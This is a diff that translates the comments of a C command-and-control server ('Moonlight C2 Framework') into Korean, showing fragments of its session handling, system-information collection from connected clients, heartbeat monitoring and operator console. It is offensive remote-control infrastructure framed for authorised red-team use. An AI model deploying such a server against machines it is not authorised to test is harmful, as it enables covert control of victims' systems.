@@ -1,9 +1,9 @@
 /*
- * Moonlight C2 Framework - Server Component
- * Target: Windows XP/2000/95/Server 2003/2008
- * Purpose: Penetration Testing and Red Team Operations
+ * Moonlight C2 Framework - 서버 컴포넌트
+ * 타겟: Windows XP/2000/95/Server 2003/2008
+ * 목적: 침투 테스트 및 레드팀 작전
  * 
- * WARNING: For authorized security testing only
+ * 경고: 승인된 보안 테스트 전용
  */
 
 #include <stdio.h>
@@ -42,7 +42,7 @@ typedef struct {
 SessionManager g_SessionManager;
 BOOL g_ServerRunning = TRUE;
 
-// Function prototypes
+// 함수 프로토타입
 void InitializeSessionManager();
 void CleanupSessionManager();
 int AddClientSession(SOCKET sock, struct sockaddr_in addr);
@@ -166,7 +166,7 @@ DWORD WINAPI ClientHandlerThread(LPVOID param) {
     printf("[+] New session established: %d from %s\n", 
            session_id, session->ip_address);
     
-    // Request initial system information
+    // 초기 시스템 정보 요청
     send(session->socket, "SYSINFO\n", 8, 0);
     
     while (g_ServerRunning && session->active) {
@@ -181,9 +181,9 @@ DWORD WINAPI ClientHandlerThread(LPVOID param) {
         buffer[bytes_received] = '\0';
         session->last_heartbeat = time(NULL);
         
-        // Parse response
+        // 응답 파싱
         if (strncmp(buffer, "SYSINFO:", 8) == 0) {
-            // Parse system info: SYSINFO:hostname|username|osversion|pid
+            // 시스템 정보 파싱: SYSINFO:hostname|username|osversion|pid
             char* token = strtok(buffer + 8, "|");
             if (token) strncpy(session->hostname, token, sizeof(session->hostname) - 1);
             
@@ -201,10 +201,10 @@ DWORD WINAPI ClientHandlerThread(LPVOID param) {
                    session->os_version, session->process_id);
         }
         else if (strncmp(buffer, "HEARTBEAT", 9) == 0) {
-            // Heartbeat received
+            // 하트비트 수신
         }
         else {
-            // Command output
+            // 명령 출력
             printf("\n[Session %d Output]\n%s\n", session_id, buffer);
         }
     }
@@ -215,7 +215,7 @@ DWORD WINAPI ClientHandlerThread(LPVOID param) {
 
 DWORD WINAPI HeartbeatMonitorThread(LPVOID param) {
     while (g_ServerRunning) {
-        Sleep(10000); // Check every 10 seconds
+        Sleep(10000); // 10초마다 체크
         
         time_t current_time = time(NULL);
         EnterCriticalSection(&g_SessionManager.lock);
@@ -292,7 +292,7 @@ void ServerConsole() {
             break;
         }
         
-        // Remove newline
+        // 개행 제거
         command[strcspn(command, "\n")] = 0;
         
         if (strlen(command) == 0) {
@@ -349,17 +349,17 @@ int main(int argc, char* argv[]) {
     
     DisplayBanner();
     
-    // Initialize Winsock
+    // Winsock 초기화
     printf("[*] Initializing Winsock...\n");
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
         printf("[!] WSAStartup failed: %d\n", WSAGetLastError());
         return 1;
     }
     
-    // Initialize session manager
+    // 세션 매니저 초기화
     InitializeSessionManager();
     
-    // Create socket
+    // 소켓 생성
     server_socket = socket(AF_INET, SOCK_STREAM, 0);
     if (server_socket == INVALID_SOCKET) {
         printf("[!] Socket creation failed: %d\n", WSAGetLastError());
@@ -372,7 +372,7 @@ int main(int argc, char* argv[]) {
     server_addr.sin_addr.s_addr = INADDR_ANY;
     server_addr.sin_port = htons(port);
     
-    // Bind socket
+    // 소켓 바인드
     if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
         printf("[!] Bind failed: %d\n", WSAGetLastError());
         closesocket(server_socket);
@@ -380,7 +380,7 @@ int main(int argc, char* argv[]) {
         return 1;
     }
     
-    // Listen
+    // 리슨
     if (listen(server_socket, MAX_CLIENTS) == SOCKET_ERROR) {
         printf("[!] Listen failed: %d\n", WSAGetLastError());
         closesocket(server_socket);
@@ -390,13 +390,13 @@ int main(int argc, char* argv[]) {
     
     printf("[+] Server listening on port %d\n", port);
     
-    // Start heartbeat monitor
+    // 하트비트 모니터 시작
     CreateThread(NULL, 0, HeartbeatMonitorThread, NULL, 0, NULL);
     
-    // Start console in separate thread
+    // 별도 스레드에서 콘솔 시작
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ServerConsole, NULL, 0, NULL);
     
-    // Accept connections
+    // 연결 수락
     client_addr_size = sizeof(client_addr);
     
     while (g_ServerRunning) {
@@ -418,7 +418,7 @@ int main(int argc, char* argv[]) {
         }
     }
     
-    // Cleanup
+    // 정리
     CleanupSessionManager();
     closesocket(server_socket);
     WSACleanup();
